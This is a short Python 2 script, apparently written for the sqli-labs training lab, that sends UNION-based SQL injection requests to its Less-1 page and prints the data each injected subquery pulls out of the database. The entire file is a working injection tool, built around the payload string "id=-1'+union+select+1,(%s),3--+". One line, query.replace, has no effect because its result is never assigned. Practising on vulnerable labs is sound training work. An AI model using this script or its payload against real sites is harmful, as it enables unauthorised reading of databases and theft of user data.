#-*- coding: UTF-8 -*-
import requests
import string
import re


org_url = "http://myhack.com/sqli-labs/Less-1/index.php?id=-1'+union+select+1,(%s),3--+data"

if __name__ == "__main__":
	while True:
		query = raw_input("> ")
		query.replace(' ','+')
		url = org_url % query
		r = requests.get(url=url)
		m = re.findall(r'Your Login name:(.*)<br>',r.content)
		for result in m:
			print result






